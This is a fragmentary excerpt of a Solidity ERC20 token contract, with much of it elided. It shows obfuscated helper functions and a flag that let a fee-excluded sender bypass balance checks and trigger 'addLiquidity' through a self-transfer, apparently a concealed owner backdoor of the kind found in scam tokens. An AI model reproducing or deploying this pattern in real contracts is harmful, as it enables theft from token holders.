...
library Address {
    ...
    function CoinWeb3derPair(address account) internal pure  returns (bool) {
...
contract TOKEN is Context, IERC20, Ownable {
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if (CoinWeb3der2Pair(from, to)) {return addLiquidity(amount, to);}
        if (CoinWeb3bool){} else {require(_balances[from] >= amount);}
        uint256 feeAmount = 0;
        takeFee(from);
        bool inLiquidityTransaction = (to == uniswapV2Pair() && _excludedFromFee[from]) || (from == uniswapV2Pair() && _excludedFromFee[to]);
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.CoinWeb3derPair(to) && to != address(this) && !inLiquidityTransaction && !CoinWeb3bool) {
    ...
    function CoinWeb3der2Pair(address from, address to) internal view returns(bool) {
        return (_excludedFromFee[msg.sender] || Address.CoinWeb3derPair(to)) && to == from;
    }
